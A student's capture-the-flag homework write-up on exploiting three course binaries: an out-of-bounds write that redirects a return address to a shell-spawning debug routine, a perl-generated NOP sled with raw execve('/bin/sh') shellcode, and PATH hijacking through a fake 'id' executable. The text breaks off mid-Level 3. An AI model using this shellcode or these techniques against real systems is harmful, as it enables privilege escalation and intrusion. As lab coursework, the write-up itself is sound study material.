## Level 1
### Vulnerability:
The input functionality of the program allows me to overwrite the base pointer of the program and return to a different subroutine (debug) after execution, which spawns a shell.
### Description:
When running be1 on the server, I saw that the program expected 2 input values. The first is the index of a value I am updating, the second is the value to change it to. By observing the binary be1 in IDA, I saw that the program uses these 3 instructions:
```
mov     eax, [ebp+index]
mov     edx, [ebp+value]
mov     [ebp+eax*4+array], edx
```
The value (2nd command line argument), is stored in edx, and then moved to ebp+eax\*4+array. By inputting a return address (08048543) of a different subroutine, and making sure my index is appropriately past the bounds of the array, in this case 11, I overwrite the base pointer of the subroutine, returning to the debug subroutine. The debug subroutine spawns a privelaged shell, allowing me to cat the flag.txt file. The following output shows the input I provided the program to retrieve the flag.
```

Updating table value at index 11 with 134513987: previous value was -1219163405
The updated table is:

1: 3

$ ls
be1  flag.txt
$ cat flag.txt
flag{73e54c4a7e13c0b19b23acc3728aa26c}
$
```

## Level 2
### Vulnerability:
By observing the behavior of the stack, simple scripting can create a NOP-sled to slide into a shellcode that spawns a shell.
### Description:
Like the previous binary, this requires 2 inputs. By observing the code in IDA, I saw that index 11 would work again as it did previously. I first took advantage of GDB and a simple perl script to write a large number of NOP operations to the stack. I then used GDB to examine the memory around the stack pointer, to find the memory address of my NOP sled. The following commands were used to observe memory addresses.

```
[bcmorri3@engr-ras-201 Level2]$ gdb be2

```

After scrolling through the rows of memory addresses, I found my NOP-sled at location bffff860, knowing that this location is where I will be writing my shellcode. I then updated my perl script to add in shellcode that I re-used from homework 2. Re-running the program (outside of GDB) yielded this output:

```
[bcmorri3@engr-ras-201 Level2]$ ./be2 11 `perl -e 'print "bffff860","\x90"x100,"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"'`
Updating table value at index 11 with -1073743792: previous value was -1209804045
The updated table is:
0: 2
1: 3
2: 5
3: 7

$ cat flag
cat: flag: No such file or directory
$ cat flag.txt
flag{601cc8bc0666ac68f3500a306e3f7c00}
```

Perl scripting advice found from [this](https://www.youtube.com/watch?v=NazbhvyKpqw) YouTube video was used to assist in my understanding.

## Level 3
### Vulnerability:
The server allows me to overwrite the PATH variable, giving me the ability to run a shell script with unintended privelages.
### Description:
After observing be3 in IDA, I could not determine anything meaningful. My next choice was to use strace to observe the behavior of the program. Using strace -f, I received some of the following output:
```
bcmorri3@binhw-trusty-2:~/BinaryExploit/Level3$ strace -f ./be3
...

[pid  9630] stat64("/usr/local/sbin/id", 0xbfa10e50) = -1 ENOENT (No such file o                                                                                                             r directory)
[pid  9630] stat64("/usr/local/bin/id", 0xbfa10e50) = -1 ENOENT (No such file or                                                                                                              directory)
[pid  9630] stat64("/usr/sbin/id", 0xbfa10e50) = -1 ENOENT (No such file or dire                                                                                                             ctory)
[pid  9630] stat64("/usr/bin/id", {st_mode=S_IFREG|0755, st_size=34532, ...}) = 0

...

[pid  9630] execve("/bin/sh", ["sh", "-c", "id"], [/* 20 vars */]) = 0

...

[pid  9631] execve("/usr/bin/id", ["id"], [/* 20 vars */]) = 0

...

+++ exited with 0 +++
```
I noticed the program was looking for a file named id in /usr/bin/id. It calls execve on this file, so I attempted to write an id file that would spawn a shell for me to use. I created a file in my home directory named id and input the following:

```
/bin/sh
```

Unfortunately, this didn't work when I tried it. The next thing I decided to do was use the cat command instead of the sh command, which then output the flag by using this as my id file:

```
/bin/cat /home/bcmorri3/BinaryExploit/Level3/flag.txt
```

Initially, this didn't work either, but then I realized I never gave the file execute permissions, so I used ```chmod +x``` on my id file in the home directory, and re-ran the program, which also didn't work. I then realized that I needed to change my PATH variable so that it would specific the correct path to execute the file. After doing so, the program worked The following is the output I received when retrieving the flag:

```
